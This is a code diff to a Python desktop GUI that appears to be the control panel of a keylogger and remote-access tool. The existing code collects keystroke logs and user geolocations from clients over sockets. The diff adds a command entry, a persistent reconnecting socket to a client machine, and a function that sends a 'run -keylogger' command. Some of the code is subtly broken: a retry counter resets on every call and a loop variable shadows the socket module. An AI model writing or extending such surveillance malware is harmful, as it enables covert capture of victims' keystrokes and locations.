@@ -6,11 +6,11 @@ import socket
 import tkinter
 import tkintermapview
 import subprocess
+import time
 
 class App(customtkinter.CTk):
     SERVER_SOCKETS= [] 
     USER_GEOLOCATIONS= []
-
 
     def __init__(self):
         super().__init__()
@@ -63,11 +63,26 @@ class App(customtkinter.CTk):
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.showFiles,text="Files")
         self.button.grid(row=3, column=0, pady =10, sticky="n")
         
-        
-        ############################################################################################
-        #                                        System                                            #
-        ###########################################################################################
+        #! Center Frame: Main content/command line
+        self.frame2 = customtkinter.CTkFrame(master=self,
+                               width=600,
+                               height=500)
+        self.frame2.grid(row=0, column=2, sticky="s")
 
+        self.entry = customtkinter.CTkEntry(master=self.frame2,
+                               placeholder_text="CTkEntry",
+                               width=400,
+                               height=50,
+                               border_width=2,
+                               corner_radius=10)
+        self.entry.grid(row=2, column=1, sticky="s")
+
+        self.button = customtkinter.CTkButton(master=self.frame2,height=25, command=self.send_to_client,text="Submit")
+        self.button.grid(row=2, column=2,padx = 10, sticky="nw")
+        
+        ###########################################################################################
+        #                                        System                                           #
+        ###########################################################################################
         #? Socket Functions
         def startSocket():
             t2 = threading.Thread(target=createKeylogSocket)
@@ -95,14 +110,61 @@ class App(customtkinter.CTk):
                         self.textbox.insert("0.0", f"{data[1:-1]}\n") 
                         print(data)
         startSocket()
-    
+        
+        # CLI socket segment
+        def start_CLI_socket():
+            t3 = threading.Thread(target=create_CLI_socket)
+            t3.daemon = True
+            t3.start()
+
+        def create_CLI_socket():
+            global cli
+            HOST = "192.168.0.103"  # Standard loopback interface address (localhost)
+            PORT = 12345  # Port to listen on (non-privileged ports are > 1023)
+            #? This makes sure that we dont loose connection for too long
+            def wake_up():
+                wake_tries = 0
+                time.sleep(10)
+                try:
+                    cli.connect((HOST,PORT))
+                    print("Success: Established new CLI connection.")
+                    wake_tries = 0
+                except Exception as e: print(f"Thrown Exception CLI_Wake_Up: {e}") 
+                
+                # After 10 minutes of no connection kill the socket
+                wake_tries+=1
+                if wake_tries >= 60:
+                    print("Error: Chosen client is offline, terminating socket.")
+                    cli.close()
+
+            # Start  CLI socket
+            while True:
+                time.sleep(3)
+                try:    
+                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    cli.connect((HOST,PORT))
+                    print("Success: Connected to CLI client.")
+                    break
+                except Exception as e: print(f"Thrown Exception CLI: {e}")
+                wake_up()
+
+        start_CLI_socket()    
+    ############################################################################################
+    #                                        Functions                                         #
+    ############################################################################################
+    def send_to_client(self):
+        global cli
+        data = self.entry.get()
+        cli.send(b"run -keylogger")
+            
     def showFiles(self):
-        subprocess.Popen('explorer "Data"')     
+        subprocess.Popen('explorer "Data"')         
     
-    def killswitch(self, sock):
+    def killswitch(self):
         try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
+            for socket in self.SERVER_SOCKETS:
+                socket.shutdown(socket.SHUT_RDWR)
+                socket.close()
             print("Succsesfully shutdown all connections.")
         except:
             print("Error: Socket shutdown. Prob no sockets to close.")
@@ -139,7 +201,6 @@ class App(customtkinter.CTk):
         geoThread.start()
         
     
-
 # Run dze up
 app = App()
 app.mainloop()
